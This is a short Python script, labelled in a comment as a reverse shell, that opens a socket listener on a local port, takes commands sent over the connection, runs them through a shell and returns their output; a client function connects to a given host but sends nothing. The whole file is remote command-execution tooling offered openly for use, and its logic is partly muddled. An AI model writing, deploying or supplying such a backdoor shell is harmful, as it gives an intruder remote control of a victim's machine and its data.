import socket
import subprocess
import os
import sys

# python reverse shell by @voiuhmaertz

def CmdProc(cmd:str):
    default_path = "/home/program/"
    process = subprocess.Popen(cmd,shell=True,stdin = subprocess.PIPE,
                           stdout=subprocess.PIPE,stderr=subprocess.PIPE,
                           cwd = default_path,text = True)
    # response = process.communicate(subprocess.PIPE)
    if cmd.replace("\n"," ").strip().lower() == "exit":
        process.stdin.close()
        process.stdout.close()
        process.stderr.close()
        process.terminate()
        sys.exit()
    
    process.stdin.write(cmd)
    process.stdin.flush()
    response = process.stdout.read().encode("utf-8")
    # print(response)
    return response

def CreateSocketServer():
    default_address = "127.0.0.1"
    default_port = "1999"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM,)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    sock.bind((default_address, int(default_port)))
    sock.listen()
    new_sock, remote_addr = sock.accept()
    while True:
        try:
            command= new_sock.recv(1024).decode("utf-8")
            data = CmdProc(command)
            if data is not None:
                new_sock.send(data)
            else:
                new_sock.send(data)
        except KeyboardInterrupt:
            sock.close()
            new_sock.close()
            sys.exit()

def CreateSocketClient(remote_address, remote_port = "1999"):
    # data = "hi"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM,)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    try:
        sock.connect((remote_address, int(remote_port)))
    except ConnectionRefusedError as error:
        print("Cannot connect to remote server")
        sys.exit()

CreateSocketServer()   
